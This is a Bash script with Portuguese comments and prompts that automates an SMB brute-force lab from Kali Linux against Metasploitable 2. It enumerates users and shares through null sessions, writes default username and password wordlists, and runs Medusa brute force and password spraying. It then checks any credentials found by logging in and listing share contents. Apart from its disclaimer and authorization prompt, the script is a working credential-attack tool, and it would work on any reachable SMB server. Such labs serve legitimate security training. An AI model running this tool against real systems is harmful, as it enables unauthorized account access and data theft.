#!/usr/bin/env bash
#
# lab_medusa.sh - Laboratorio controlado de forca bruta SMB com Medusa
# Alvo padrao: Metasploitable 2   |   Execucao: Kali Linux
#
# USO AUTORIZADO APENAS: redes isoladas de estudo (Host-Only / NAT Network)
# e maquinas de sua propriedade ou com permissao escrita.
#
# Uso: chmod +x lab_medusa.sh && ./lab_medusa.sh
#      sudo ./lab_medusa.sh   (recomendado para enum4linux/nmap)

set -uo pipefail

VERSION="1.0"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORD_DIR="$BASE_DIR/wordlists"
OUT_DIR="$BASE_DIR/resultados_$(date +%Y%m%d_%H%M%S)"
REPORT="$OUT_DIR/relatorio.txt"
USERS="$WORD_DIR/users.txt"
PASSES="$WORD_DIR/pass.txt"

SMB_PORTS=(139 445)
DEFAULT_THREADS=4
ASSUME_YES=0

if [[ -t 1 ]]; then
  C_RED=$'\e[31m'; C_GRN=$'\e[32m'; C_YEL=$'\e[33m'
  C_CYA=$'\e[36m'; C_BLD=$'\e[1m'; C_RST=$'\e[0m'
else
  C_RED=""; C_GRN=""; C_YEL=""; C_CYA=""; C_BLD=""; C_RST=""
fi

info()  { printf '%s[*]%s %s\n' "$C_CYA" "$C_RST" "$*"; }
ok()    { printf '%s[+]%s %s\n' "$C_GRN" "$C_RST" "$*"; }
warn()  { printf '%s[!]%s %s\n' "$C_YEL" "$C_RST" "$*"; }
err()   { printf '%s[-]%s %s\n' "$C_RED" "$C_RST" "$*" >&2; }
die()   { err "$*"; exit 1; }
title() { printf '\n%s== %s ==%s\n' "$C_BLD" "$*" "$C_RST"; }

report() {
  printf '%s\n' "$*" >>"$REPORT"
}

ask() {
  local prompt="$1" default="${2:-}" answer
  if [[ -n "$default" ]]; then
    read -rp "$prompt [$default]: " answer
    printf '%s' "${answer:-$default}"
  else
    read -rp "$prompt: " answer
    printf '%s' "$answer"
  fi
}

confirm() {
  local prompt="$1" answer
  read -rp "$prompt [s/N]: " answer
  [[ "$answer" =~ ^[sSyY]$ ]]
}

pause() {
  read -rp "Pressione ENTER para continuar..." _
}

check_deps() {
  local missing=() cmd
  for cmd in medusa smbclient nmap timeout; do
    command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
  done
  command -v rpcclient >/dev/null 2>&1 || missing+=("rpcclient")
  command -v enum4linux-ng >/dev/null 2>&1 || command -v enum4linux >/dev/null 2>&1 || missing+=("enum4linux")

  if ((${#missing[@]})); then
    warn "Dependencias ausentes: ${missing[*]}"
    if ((ASSUME_YES)); then
      warn "Modo nao interativo: instale com"
      warn "  sudo apt install -y ${missing[*]}"
    elif confirm "Instalar agora via apt?"; then
      sudo apt update && sudo apt install -y medusa smbclient samba-common-bin nmap enum4linux
    else
      warn "Seguindo sem as ferramentas opcionais."
    fi
  fi
  command -v medusa >/dev/null 2>&1 || die "medusa nao encontrado. Instale com: sudo apt install medusa"
  command -v smbclient >/dev/null 2>&1 || die "smbclient nao encontrado. Instale com: sudo apt install smbclient"
}

validate_ip() {
  local ip="$1" octet
  local -a octets
  [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS=. read -r -a octets <<<"$ip"
  for octet in "${octets[@]}"; do
    ((octet >= 0 && octet <= 255)) || return 1
  done
  return 0
}

port_open() {
  timeout 3 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null
}

probe_target() {
  title "Alvo: $TARGET"
  if ! ping -c 1 -W 2 "$TARGET" >/dev/null 2>&1; then
    warn "Alvo nao respondeu ao ping (pode estar bloqueado, nao impedimento)."
  fi
  local open=() p
  for p in "${SMB_PORTS[@]}"; do
    port_open "$TARGET" "$p" && open+=("$p")
  done
  if ((${#open[@]})); then
    ok "Portas SMB abertas: ${open[*]}"
    report "Alvo: $TARGET | portas SMB abertas: ${open[*]}"
  else
    warn "Nenhuma porta SMB (139/445) respondeu. Confira a rede do laboratorio."
    report "Alvo: $TARGET | NENHUMA porta SMB aberta"
  fi
}

get_target() {
  local ip
  while :; do
    ip="$(ask "IP do alvo (Metasploitable 2)")"
    validate_ip "$ip" && break
    err "IP invalido: $ip"
  done
  TARGET="$ip"
  probe_target
}

make_wordlists() {
  mkdir -p "$WORD_DIR"
  if [[ -s "$USERS" && -s "$PASSES" ]]; then
    if ((ASSUME_YES)) || confirm "Wordlists ja existem. Reutilizar?"; then
      ok "Usando $USERS e $PASSES"
      return
    fi
  fi
  cat >"$USERS" <<'EOF'
msfadmin
user
service
root
admin
guest
ftp
nobody
EOF
  cat >"$PASSES" <<'EOF'
msfadmin
password
123456
admin
root
user
toor
12345678
Passw0rd
EOF
  ok "Wordlists padrao criadas em $WORD_DIR"
}

enum_smb() {
  mkdir -p "$OUT_DIR"
  title "Enumeracao SMB"
  info "Listando compartilhamentos (sessao nula)..."
  smbclient -L "//$TARGET" -N 2>&1 | tee "$OUT_DIR/smbclient_list.txt"
  report ""
  report "--- smbclient -L (null) ---"
  [[ -f "$OUT_DIR/smbclient_list.txt" ]] && sed 's/^/  /' "$OUT_DIR/smbclient_list.txt" >>"$REPORT"

  if command -v rpcclient >/dev/null 2>&1; then
    info "Enumerando usuarios via rpcclient..."
    rpcclient -U "" -N "$TARGET" -c "enumdomusers" 2>/dev/null \
      | sed -nE 's/.*user:\[([^]]+)\].*/\1/p' >"$OUT_DIR/usuarios_rpc.txt"
    if [[ -s "$OUT_DIR/usuarios_rpc.txt" ]]; then
      ok "Usuarios encontrados: $(paste -sd, "$OUT_DIR/usuarios_rpc.txt")"
      report "Usuarios (rpcclient): $(paste -sd, "$OUT_DIR/usuarios_rpc.txt")"
    else
      warn "Sessao nula nao retornou usuarios."
    fi
  fi

  info "Coletando informacoes de SO/sessao com nmap..."
  nmap -p139,445 --script smb-os-discovery,smb2-security-mode "$TARGET" \
    -oN "$OUT_DIR/nmap_smb.txt" >/dev/null 2>&1
  report ""
  report "--- nmap SMB ---"
  [[ -f "$OUT_DIR/nmap_smb.txt" ]] && sed 's/^/  /' "$OUT_DIR/nmap_smb.txt" >>"$REPORT"

  local run_enum=0
  if ((ASSUME_YES)); then
    [[ "${ENUM4LINUX:-0}" == "1" ]] && run_enum=1
  elif confirm "Executar enum4linux completo (pode levar alguns minutos)?"; then
    run_enum=1
  fi
  if ((run_enum)); then
    if command -v enum4linux-ng >/dev/null 2>&1; then
      enum4linux-ng -A "$TARGET" -oJ "$OUT_DIR/enum4linux" 2>&1 | tee "$OUT_DIR/enum4linux.txt" >/dev/null
    elif command -v enum4linux >/dev/null 2>&1; then
      enum4linux -a "$TARGET" 2>&1 | tee "$OUT_DIR/enum4linux.txt" >/dev/null
    else
      warn "enum4linux nao instalado; etapa ignorada."
    fi
    [[ -f "$OUT_DIR/enum4linux.txt" ]] && ok "Saida salva em $OUT_DIR"
  fi

  if [[ -s "$OUT_DIR/usuarios_rpc.txt" ]]; then
    local before after
    before=$(wc -l <"$USERS" 2>/dev/null || echo 0)
    cat "$OUT_DIR/usuarios_rpc.txt" >>"$USERS"
    sort -u "$USERS" -o "$USERS"
    after=$(wc -l <"$USERS")
    ok "Wordlist de usuarios atualizada: $before -> $after entradas"
  fi
}

parse_found() {
  local log="$1"
  grep -aiE 'ACCOUNT[ _]FOUND' "$log" 2>/dev/null | while IFS= read -r line; do
    local u p
    u=$(sed -nE 's/.*[Uu]ser:[[:space:]]*([^[:space:]]+).*/\1/p' <<<"$line")
    p=$(sed -nE 's/.*[Pp]assword:[[:space:]]*(.*)[[:space:]]+\[.*/\1/p' <<<"$line")
    [[ -n "$u" ]] && printf '%s:%s\n' "$u" "${p:-<vazia>}"
  done | sort -u
}

run_medusa() {
  [[ -s "$USERS" && -s "$PASSES" ]] || { err "Wordlists ausentes em $WORD_DIR"; return 1; }
  local threads log combos
  if ((ASSUME_YES)); then
    threads="${THREADS:-$DEFAULT_THREADS}"
  else
    threads="$(ask "Threads paralelas (1-16)" "$DEFAULT_THREADS")"
  fi
  [[ "$threads" =~ ^[0-9]+$ ]] && ((threads >= 1 && threads <= 16)) || threads=$DEFAULT_THREADS

  combos=$(( ($(grep -cve '^[[:space:]]*$' "$USERS") + 1) * ($(grep -cve '^[[:space:]]*$' "$PASSES") + 1) * 3 ))
  log="$OUT_DIR/medusa_smb.log"
  title "Medusa - SMB brute force"
  info "Usuarios: $(grep -cve '^[[:space:]]*$' "$USERS") | Senhas: $(grep -cve '^[[:space:]]*$' "$PASSES")"
  info "Combinacoes aprox. (com -e nsr): $combos | Threads: $threads"
  warn "Pressione Ctrl+C para abortar."

  medusa -h "$TARGET" -U "$USERS" -P "$PASSES" -M smbnt \
         -e nsr -t "$threads" -f -v 6 -O "$log" -b 2>&1 \
    | tee "$OUT_DIR/medusa_console.txt"

  local found
  found="$(parse_found "$log")"
  report ""
  report "--- Medusa ---"
  if [[ -n "$found" ]]; then
    ok "Credenciais validas encontradas:"
    printf '%s\n' "$found" | while IFS=: read -r u p; do
      printf '    %s%s%s : %s\n' "$C_GRN" "$u" "$C_RST" "$p"
      report "  $u:$p"
    done
    printf '%s\n' "$found" >"$OUT_DIR/credenciais.txt"
    validate_found "$found"
  else
    warn "Nenhum par valido. Verifique wordlists, timeout e lockout."
    report "  nenhuma credencial valida"
  fi
}

spray() {
  [[ -s "$USERS" ]] || { err "Wordlist de usuarios ausente."; return 1; }
  local pass line out hits=0
  read -rsp "Senha a pulverizar: " pass; echo
  [[ -n "$pass" ]] || { err "Senha vazia."; return 1; }
  title "Password Spraying (1 senha x muitos usuarios)"
  warn "Tentativa lenta e deliberada para reduzir risco de bloqueio de conta."
  report ""
  report "--- Password spraying ---"
  while IFS= read -r line; do
    line="${line%$'\r'}"
    [[ -z "${line//[[:space:]]/}" ]] && continue
    out="$(medusa -h "$TARGET" -u "$line" -p "$pass" -M smbnt -f -t 1 -v 4 -b 2>&1)"
    if grep -qiE 'ACCOUNT[ _]FOUND' <<<"$out"; then
      ok "SUCESSO: $line:$pass"
      report "  $line:$pass"
      hits=$((hits + 1))
    else
      printf '    %s... falhou\n' "$line"
    fi
    sleep 2
  done <"$USERS"
  ((hits)) || warn "Nenhuma conta aceitou a senha informada."
}

validate_creds() {
  local u="$1" p="$2" list share
  if ! list=$(smbclient -L "//$TARGET" -U "$u%$p" -g 2>&1); then
    err "Falha ao autenticar $u:$p -> $(tail -n1 <<<"$list")"
    return 1
  fi
  ok "Login SMB valido: $u:$p"
  share=$(awk -F'|' '$1=="Disk"{print $2; exit}' <<<"$list")
  if [[ -n "$share" ]]; then
    info "Testando leitura no share '$share'..."
    smbclient "//$TARGET/$share" -U "$u%$p" -c "ls" 2>&1 | head -n 20
  fi
  return 0
}

validate_found() {
  local pairs="$1" u p
  title "Validacao com smbclient"
  while IFS=: read -r u p; do
    [[ -z "$u" ]] && continue
    [[ "$p" == "<vazia>" ]] && p=""
    validate_creds "$u" "$p"
  done <<<"$pairs"
}

validate_manual() {
  local u p
  u="$(ask "Usuario")"
  read -rsp "Senha: " p; echo
  validate_creds "$u" "$p"
}

show_help() {
  cat <<EOF
${C_BLD}lab_medusa.sh v$VERSION${C_RST} - laboratorio SMB (Medusa)

  ./lab_medusa.sh            menu interativo
  ./lab_medusa.sh --help     esta ajuda
  ./lab_medusa.sh --full     execucao completa nao interativa (IP via \$TARGET)

Variaveis de ambiente:
  TARGET=192.168.56.101      alvo do laboratorio
  THREADS=4                  threads do Medusa
  ENUM4LINUX=1               com --full, executa enum4linux completo

Artefatos gerados:
  wordlists/users.txt        usuarios
  wordlists/pass.txt         senhas
  resultados_<timestamp>/     logs, relatorio, credenciais
EOF
}

main_menu() {
  title "Kali + Metasploitable 2 :: Medusa SMB"
  cat <<EOF
  1) Execucao completa (enumeracao -> wordlists -> Medusa -> validacao)
  2) Enumeracao SMB apenas
  3) Forca bruta Medusa (wordlists existentes)
  4) Password spraying (1 senha x lista de usuarios)
  5) Validar credenciais com smbclient
  6) Gerar wordlists padrao
  0) Sair
EOF
  local opt
  opt="$(ask "Escolha")"
  case "$opt" in
    1) make_wordlists; enum_smb; run_medusa; pause ;;
    2) enum_smb; pause ;;
    3) run_medusa; pause ;;
    4) spray; pause ;;
    5) validate_manual; pause ;;
    6) make_wordlists; pause ;;
    0) exit 0 ;;
    *) err "Opcao invalida" ;;
  esac
}

banner() {
  printf '%s' "$C_RED"
  cat <<'EOF'
  +------------------------------------------------------------+
  |   M E D U S A  ::  SMB BRUTE FORCE  ::  L A B               |
  |   Kali Linux  ->  Metasploitable 2                          |
  +------------------------------------------------------------+
EOF
  printf '%s' "$C_RST"
  printf '  Forca bruta SMB controlada - uso exclusivo em laboratorio autorizado\n'
  printf '  v%s | Kali Linux -> Metasploitable 2 | Medusa\n\n' "$VERSION"
}

main() {
  case "${1:-}" in
    -h|--help) show_help; exit 0 ;;
    --full|--yes)
      ASSUME_YES=1
      [[ -n "${TARGET:-}" ]] || die "Defina TARGET=IP (ex.: TARGET=192.168.56.101 $0 --full)"
      validate_ip "$TARGET" || die "TARGET invalido"
      banner; check_deps; mkdir -p "$OUT_DIR"; make_wordlists
      probe_target; enum_smb; run_medusa
      ok "Relatorio: $REPORT"
      exit 0
      ;;
  esac

  banner
  cat <<EOF
${C_YEL}AVISO LEGAL${C_RST}
Esta ferramenta executa ataques de forca bruta em SMB. Use SOMENTE em
ambiente de laboratorio isolado (Metasploitable 2 em rede Host-Only/NAT
Network) ou em sistemas com autorizacao escrita. O uso contra terceiros
sem permissao e crime (Lei 12.737/2012 e correlatas).
EOF
  confirm "Confirmo que tenho autorizacao para testar este alvo" || { warn "Abortado."; exit 1; }

  check_deps
  mkdir -p "$OUT_DIR" "$WORD_DIR"
  report "Laboratorio Medusa SMB - $(date '+%Y-%m-%d %H:%M:%S')"
  report "Operador: $(whoami)@$(hostname)"
  get_target
  while :; do main_menu; done
}

main "$@"
